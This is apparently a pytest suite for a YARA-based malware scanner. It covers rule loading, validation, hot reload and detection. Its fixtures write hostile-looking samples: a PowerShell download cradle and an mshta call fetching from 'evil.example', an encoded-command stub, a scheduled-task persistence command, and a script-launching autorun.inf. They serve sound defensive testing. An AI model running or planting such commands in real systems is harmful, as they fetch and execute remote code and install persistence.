"""Tests for the YARA starter rule set and YaraEngine integration.

Covers spec section 18: rule loading, validation, detection, and the
mandatory-free graceful path when yara-python is unavailable. All rule
files are read from the sandboxed signatures directory (tests/conftest
redirects utils.paths.yara_rules_dir), so the repository's real rule
set is copied - never modified.
"""

from __future__ import annotations

import shutil
from pathlib import Path

import pytest

from engine.yara_engine import YaraEngine, YARA_AVAILABLE

REPO_RULES = Path(__file__).resolve().parent.parent / "signatures" / "yara"


@pytest.fixture()
def rules_dir(tmp_path) -> Path:
    """Copy the repository's starter rules into the sandbox."""
    target = tmp_path / "yara"
    target.mkdir(exist_ok=True)
    for rule in REPO_RULES.glob("*.y*"):
        shutil.copy2(rule, target / rule.name)
    return target


def _engine(rules_dir: Path) -> YaraEngine:
    """Engine over the sandboxed copy of the starter rules."""
    engine = YaraEngine(rules_dir=rules_dir)
    assert engine.available, "yara-python must be installed for these tests"
    return engine


def _write(rules_dir: Path, name: str, content: str) -> None:
    """Drop one rule file into the sandboxed rules directory."""
    (rules_dir / name).write_text(content, encoding="utf-8")


# ---------------------------------------------------------------------------
# Loading and validation
# ---------------------------------------------------------------------------


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_all_starter_rules_compile(rules_dir):
    """Every bundled rule file loads; reload returns the file count."""
    engine = _engine(rules_dir)
    assert engine.reload() == 4  # eicar + 3 starter files
    assert engine.validate_rules() == []


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_validate_reports_broken_rule(rules_dir):
    """A syntax-broken rule file is reported, never crashes the engine."""
    _write(rules_dir, "broken.yar", "rule Broken { strings: $a = ")
    engine = YaraEngine(rules_dir=rules_dir)
    assert "broken.yar" in engine.validate_rules()


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_one_broken_file_does_not_break_others(rules_dir):
    """YaraEngine compiles the good set even when one file is invalid."""
    _write(rules_dir, "broken.yar", "rule Broken { strings: $a = ")
    _write(rules_dir, "valid.yar", "rule Valid { condition: filesize < 0 }")
    engine = YaraEngine(rules_dir=rules_dir)
    # compile(sources=...) fails wholesale; engine must stay usable.
    engine.reload()
    broken = engine.validate_rules()
    assert "broken.yar" in broken
    assert "valid.yar" not in broken


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_meta_is_read_into_matches(rules_dir):
    """Match metadata (severity/category/description) flows through.

    Uses an in-memory data scan (scan_data) with a benign custom rule
    so the test cannot be flaked by Defender's on-access scan removing
    an EICAR-shaped file from disk before YARA opens it.
    """
    _write(rules_dir, "meta_probe.yar", (
        'rule KhokharGuard_MetaProbe\n'
        '{\n'
        '    meta:\n'
        '        description = "metadata probe"\n'
        '        severity    = "medium"\n'
        '        category    = "probe"\n'
        '    strings:\n'
        '        $a = "KHOKHARGUARD-METADATA-PROBE-PAYLOAD"\n'
        '    condition:\n'
        '        $a\n'
        '}\n'))
    engine = _engine(rules_dir)
    matches = engine.scan_data(
        b"prefix...KHOKHARGUARD-METADATA-PROBE-PAYLOAD...suffix")
    assert matches, "probe rule must hit in-memory data"
    first = matches[0]
    assert first.rule == "KhokharGuard_MetaProbe"
    assert first.severity == "medium"
    assert first.category == "probe"
    # The EICAR demo rule also matches the standard string in memory.
    eicar = (b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS"
             b"-TEST-FILE!$H+H*")
    assert any(m.rule == "KhokharGuard_EICAR_Test_File"
               for m in engine.scan_data(eicar))


# ---------------------------------------------------------------------------
# Detection: each starter rule against its intended artifact shape
# ---------------------------------------------------------------------------


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_detects_powershell_download_cradle(rules_dir, tmp_path):
    """Download-cradle script is flagged; a plain script is not."""
    engine = _engine(rules_dir)
    bad = tmp_path / "cradle.ps1"
    bad.write_text(
        'powershell -c "iex(new-object net.webclient)'
        ".downloadstring('http://evil.example/p.ps1')\"\n",
        encoding="utf-8")
    good = tmp_path / "hello.ps1"
    good.write_text('Write-Output "hello"\n', encoding="utf-8")

    assert any(
        m.rule == "KhokharGuard_Script_PowerShell_Download_Cradle"
        for m in engine.scan_file(bad))
    assert not engine.scan_file(good)


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_detects_base64_obfuscated_execution(rules_dir, tmp_path):
    """Large base64 blob + -enc flag matches the obfuscation rule."""
    engine = _engine(rules_dir)
    blob = "QQ" * 400  # 800 base64 chars
    target = tmp_path / "obfuscated.cmd"
    target.write_text(
        f"powershell -enc {blob}\n", encoding="utf-8")
    assert any(
        m.rule == "KhokharGuard_Script_Obfuscated_Base64_Execution"
        for m in engine.scan_file(target))


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_detects_schtasks_persistence(rules_dir, tmp_path):
    """Scheduled-task creation for a script interpreter is flagged."""
    engine = _engine(rules_dir)
    target = tmp_path / "persist.bat"
    target.write_text(
        "schtasks /create /tn Updater /tr "
        "\"powershell.exe -File C:\\\\run.ps1\" /sc daily\n",
        encoding="utf-8")
    assert any(
        m.rule == "KhokharGuard_Script_Persistence_Scheduled_Task"
        for m in engine.scan_file(target))


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_detects_mshta_remote_execution(rules_dir, tmp_path):
    """mshta with a remote URL or inline vbscript is flagged (high)."""
    engine = _engine(rules_dir)
    target = tmp_path / "dropper.js"
    target.write_text(
        'var sh = new ActiveXObject("wscript.shell");\n'
        'sh.Run("mshta http://evil.example/x.hta");\n',
        encoding="utf-8")
    matches = engine.scan_file(target)
    hit = next(m for m in matches
               if m.rule == "KhokharGuard_Script_Mshta_Remote_Execution")
    assert hit.severity == "high"


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_lnk_rules_require_lnk_magic(rules_dir, tmp_path):
    """LNK rules must not fire on text files lacking the .lnk magic."""
    engine = _engine(rules_dir)
    plain = tmp_path / "notes.txt"
    plain.write_text("cmd.exe /c something\n", encoding="utf-8")
    assert engine.scan_file(plain) in (None, [])


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_detects_malicious_url_shortcut(rules_dir, tmp_path):
    """Internet shortcut pointing at a local executable is flagged."""
    engine = _engine(rules_dir)
    target = tmp_path / "invoice.url"
    target.write_text(
        "[InternetShortcut]\nURL=file:///C:/Users/x/run.exe\n",
        encoding="utf-8")
    assert any(
        m.rule == "KhokharGuard_URL_Open_Executable_Or_Script"
        for m in engine.scan_file(target))


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_detects_malicious_autorun(rules_dir, tmp_path):
    """autorun.inf auto-opening a script is flagged; icon-only is not."""
    engine = _engine(rules_dir)
    bad_dir = tmp_path / "cases"
    bad_dir.mkdir()
    bad = bad_dir / "autorun.inf"
    bad.write_text(
        "[autorun]\nopen=wscript.exe run.vbs\n", encoding="utf-8")
    good_dir = tmp_path / "clean"
    good_dir.mkdir()
    good = good_dir / "autorun.inf"
    good.write_text(
        "[autorun]\nlabel=Backup\nicon=setup.exe,0\n", encoding="utf-8")
    assert engine.scan_file(bad), "script autorun must match"
    assert not engine.scan_file(good), "icon-only autorun must not match"


# ---------------------------------------------------------------------------
# FileAnalyzer integration
# ---------------------------------------------------------------------------


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_file_analyzer_uses_yara_for_scripts(rules_dir, tmp_path):
    """Script files are YARA-eligible and YARA matches drive the verdict."""
    from engine.file_analyzer import FileAnalyzer
    from engine.signature_engine import SignatureEngine
    from database.database import Database

    database = Database(tmp_path / "yara_test.db")
    signature_engine = SignatureEngine(database=database)
    engine = FileAnalyzer(
        signature_engine=signature_engine,
        yara_engine=YaraEngine(rules_dir=rules_dir),
        hash_cache=False,
    )
    # Script content matching the cradle rule -> yara detection.
    target = tmp_path / "cradle.js"
    target.write_text(
        'var sh = new ActiveXObject("wscript.shell");\n'
        'sh.Run("powershell -c iex(new-object net.webclient)'
        ".downloadstring('http://evil.example/p'));\n",
        encoding="utf-8")
    detection = engine.analyze_path(target)
    assert detection.detection_method == "yara"
    assert detection.detection_name == (
        "YARA.KhokharGuard_Script_PowerShell_Download_Cradle")
    assert "PowerShell" in detection.reason  # rule description surfaced
    database.close()


# ---------------------------------------------------------------------------
# Hot reload: rule files changing under signatures/yara/ without restart
# ---------------------------------------------------------------------------


PROBE_A = (
    'rule KhokharGuard_HotProbe_A\n'
    '{\n'
    '    strings:\n'
    '        $a = "KHOKHARGUARD-HOT-RELOAD-PAYLOAD-A"\n'
    '    condition:\n'
    '        $a\n'
    '}\n'
)

PROBE_B = (
    'rule KhokharGuard_HotProbe_B\n'
    '{\n'
    '    strings:\n'
    '        $a = "KHOKHARGUARD-HOT-RELOAD-PAYLOAD-B"\n'
    '    condition:\n'
    '        $a\n'
    '}\n'
)

PAYLOAD_A = b"x KHOKHARGUARD-HOT-RELOAD-PAYLOAD-A x"
PAYLOAD_B = b"x KHOKHARGUARD-HOT-RELOAD-PAYLOAD-B x"


def _hits(engine: YaraEngine, data: bytes, rule: str) -> bool:
    """True when the named rule fires on the in-memory sample."""
    matches = engine.scan_data(data) or []
    return any(m.rule == rule for m in matches)


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_new_rule_file_is_picked_up_without_restart(rules_dir):
    """Dropping a rule file in applies it on the next scan."""
    engine = _engine(rules_dir)
    assert not _hits(engine, PAYLOAD_B, "KhokharGuard_HotProbe_B")

    _write(rules_dir, "hot_b.yar", PROBE_B)
    assert _hits(engine, PAYLOAD_B, "KhokharGuard_HotProbe_B"), (
        "new rule must apply without an explicit reload()")


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_edited_rule_is_picked_up_without_restart(rules_dir):
    """Editing a rule file's pattern applies on the next scan."""
    _write(rules_dir, "hot_a.yar", PROBE_A.replace("PAYLOAD-A", "OLD"))
    engine = _engine(rules_dir)
    assert not _hits(engine, PAYLOAD_A, "KhokharGuard_HotProbe_A")

    _write(rules_dir, "hot_a.yar", PROBE_A)
    assert _hits(engine, PAYLOAD_A, "KhokharGuard_HotProbe_A")


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_deleted_rule_stops_matching(rules_dir):
    """Removing a rule file retires its detections."""
    _write(rules_dir, "hot_a.yar", PROBE_A)
    engine = _engine(rules_dir)
    assert _hits(engine, PAYLOAD_A, "KhokharGuard_HotProbe_A")

    (rules_dir / "hot_a.yar").unlink()
    assert not _hits(engine, PAYLOAD_A, "KhokharGuard_HotProbe_A")


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_broken_edit_keeps_last_good_rule_set(rules_dir):
    """A bad edit never blanks protection: old rules stay, then recover."""
    _write(rules_dir, "hot_a.yar", PROBE_A)
    engine = _engine(rules_dir)
    assert _hits(engine, PAYLOAD_A, "KhokharGuard_HotProbe_A")

    # Break every rule file: wholesale compilation must fail...
    _write(rules_dir, "hot_a.yar", "rule Broken { strings: $a = ")
    # ...yet the last good set stays active, and other rules still work.
    assert _hits(engine, PAYLOAD_A, "KhokharGuard_HotProbe_A"), (
        "broken edit must not disable the previous good rule set")

    # Fixing the file recovers compilation and enables new rules.
    _write(rules_dir, "hot_a.yar", PROBE_A)
    _write(rules_dir, "hot_b.yar", PROBE_B)
    assert _hits(engine, PAYLOAD_A, "KhokharGuard_HotProbe_A")
    assert _hits(engine, PAYLOAD_B, "KhokharGuard_HotProbe_B")
